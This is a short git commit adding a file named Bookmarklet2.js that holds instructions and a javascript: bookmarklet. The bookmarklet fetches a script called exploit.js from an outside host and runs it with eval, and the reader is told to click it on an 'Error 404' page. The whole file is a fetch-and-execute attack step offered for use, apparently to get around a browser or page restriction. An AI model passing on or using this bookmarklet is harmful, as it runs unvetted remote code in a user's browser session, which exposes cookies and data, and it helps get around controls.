66918e2a2cb152f05d142e3f2e912f8e37dbfd95
frantene <112424233+frantene@users.noreply.github.com>
2022-10-19 08:42:45 -0500

    Bookmarklet2.js
    2nd Option

---
+++ Bookmarklet2.js
@@ -0,0 +1,6 @@
+This is the same instructions as the bookmarklet.js but in this one you get this link
+
+javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+
+and put it in your bookmarks and when the page takes you to "Error 404"
+click the bookmark with the link.
